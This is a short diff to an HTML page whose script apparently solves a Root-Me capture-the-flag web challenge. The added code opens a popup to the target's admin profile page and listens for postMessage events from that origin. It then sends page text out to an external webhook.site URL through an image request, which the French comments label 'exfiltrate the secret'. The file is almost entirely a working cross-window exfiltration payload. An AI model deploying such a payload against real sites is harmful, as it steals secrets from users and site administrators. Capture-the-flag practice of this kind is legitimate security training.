@@ -1,12 +1,20 @@
 
+
 <html>
 <script>
-var win = window.open('http://challenge01.root-me.org:58003/profile');
+    // Ouvrir la popup vers le profil de l'admin
+    var win = window.open('http://challenge01.root-me.org:58003/profile'); 
 
-window.addEventListener('message', function(event) {
-    console.log("Message reçu :", event.origin, event.data);
-    alert("Message reçu : " + event.data);
-});
+    // Écouter les messages de la popup
+    window.addEventListener('message', function(event) {
+        // Vérifier l'origine du message
+        if (event.origin === 'http://challenge01.root-me.org:58003') { 
+            // Exfiltrer le secret
+            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(document.body.innerText); 
+        } 
+    }); 
 </script>
 </html>
+
+
 
